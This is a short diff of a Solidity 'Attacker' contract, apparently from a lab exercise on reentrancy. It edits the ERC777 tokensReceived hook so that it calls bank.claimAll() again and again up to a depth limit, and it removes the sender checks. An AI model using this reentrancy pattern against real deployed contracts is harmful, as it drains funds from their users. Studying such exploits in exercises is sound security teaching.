@@ -63,16 +63,14 @@ contract Attacker is AccessControl, IERC777Recipient {
 		uint256 amount,
 		bytes calldata userData,
 		bytes calldata operatorData
-	) external override {
+	) external {
 		//YOUR CODE TO RECURSE GOES HERE
-		require(amount > 0, "Must receive a positive amount");
-    require(msg.sender == address(bank.token()), "Only accept tokens from Bank's token");
-
-    if (depth < max_depth && bank.balances(address(this)) > 0) {
-        depth++;
-        bank.claimAll();
+		if (depth < max_depth) {
+            depth++;
+            bank.claimAll();
+            depth--;
+        }
 
 	}
-}
 }
 
